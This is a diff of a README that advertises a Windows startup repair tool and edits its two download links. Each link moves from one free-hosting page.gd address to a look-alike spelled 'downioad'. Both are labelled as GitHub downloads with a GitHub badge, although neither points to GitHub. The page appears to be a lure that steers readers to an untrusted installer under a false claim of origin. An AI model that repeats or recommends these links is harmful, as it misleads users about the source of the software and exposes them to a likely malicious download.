@@ -2,7 +2,7 @@
 
 Windows Startup Repair Advanced Tool is a comprehensive software solution designed for Windows 10 and Windows 11 users to quickly diagnose and fix various startup problems. Whether your computer fails to boot, encounters blue screen errors, or gets stuck in a loop, this tool provides a reliable way to restore system functionality without requiring advanced technical skills. Developed with user-friendly interfaces and powerful algorithms, it ensures that your Windows experience remains smooth and efficient in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -78,7 +78,7 @@ It's advisable to run a scan periodically, such as after major Windows updates o
 
 For the latest version and updates, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
